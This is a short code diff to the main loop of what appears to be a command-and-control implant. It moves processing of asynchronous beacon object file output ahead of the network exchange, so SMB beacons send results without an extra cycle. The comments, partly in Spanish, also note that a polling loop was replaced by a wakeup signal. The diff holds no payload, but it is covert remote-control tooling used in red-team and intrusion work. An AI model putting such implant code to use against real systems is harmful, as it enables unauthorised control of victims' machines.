@@ -75,6 +75,12 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
 			}
 
+			// ProcessAsyncBofs se llama ANTES de Exchange para que el output de BOFs
+			// asincronos se incluya en el mismo ciclo de envio en que se produce,
+			// sin esperar un ciclo extra (critico para beacons SMB con INFINITE wait).
+			// el probloema era que ejecutar un BOF asincrno en un Agente SMB, la salida quedaba en cola hasta la ejecucion de otro comando/BOF (siempre que no fuera asincrono)
+			g_AsyncBofManager->ProcessAsyncBofs(packerOut);
+
 			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData())
 				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
 
@@ -83,7 +89,6 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 			g_Agent->jober->ProcessJobs(packerOut);
 			g_Agent->proxyfire->ProcessTunnels(packerOut);
 			g_Agent->pivotter->ProcessPivots(packerOut);
-			g_AsyncBofManager->ProcessAsyncBofs(packerOut);
 
 			if (g_Agent->IsActive()) {
 				BOOL hasOutput = (packerOut->datasize() >= 8) || justSentOutput;
@@ -94,6 +99,10 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 				if (g_Agent->pivotter->pendingWrite)
 					pollIntervalMs = 10;
 
+				// The 50ms polling loop for async BOFs was removed: BofOutputToContext now
+				// calls SignalWakeup() every time the BOF produces output, which immediately
+				// unblocks ConnectorSMB (WaitForMultipleObjects) and WaitMaskWithEvent
+				// (HTTP/TCP/DNS) without ignoring the sleep_delay.
 				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput, pollIntervalMs);
 			}
 
